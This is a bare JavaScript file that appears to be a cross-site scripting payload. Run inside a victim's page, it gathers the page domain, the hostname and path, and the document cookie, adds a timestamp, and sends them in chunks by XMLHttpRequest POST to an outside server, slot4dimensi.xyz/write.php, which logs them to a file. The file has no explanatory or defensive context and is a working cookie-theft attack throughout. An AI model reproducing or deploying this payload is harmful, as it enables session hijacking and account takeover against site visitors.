var textData = [
  ['XSS Alert', document['domain']],
  ['URL Target', document['location']['hostname'] + document['location']['pathname']],
  ['Document Cookie', document['cookie']]
];

var csvData = textData.map(function(row) {
  return row.join(',');
}).join('\n') + '\n'; // add a blank line at the end of each section

var chunkSize = 1024; // adjust the chunk size according to your needs
var filename = 'result.txt';
var xhr = new XMLHttpRequest();
var chunkIndex = 0;

function writeChunk() {
  var chunk = csvData.substring(chunkIndex, chunkIndex + chunkSize);
  xhr.open('POST', 'https://slot4dimensi.xyz/write.php', true);
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.send('data=' + encodeURIComponent(chunk) + '&filename=' + encodeURIComponent(filename) + '&append=true');
  chunkIndex += chunkSize;
}

xhr.onreadystatechange = function() {
  if (xhr.readyState === 4 && xhr.status === 200) {
    if (chunkIndex < csvData.length) {
      writeChunk();
    }
  }
};

// Add a timestamp to each section
function addTimestamp() {
  var timestamp = new Date().toLocaleString();
  var newCsvData = 'Timestamp: ' + timestamp + '\n' + csvData;
  csvData = newCsvData;
}

addTimestamp();
writeChunk();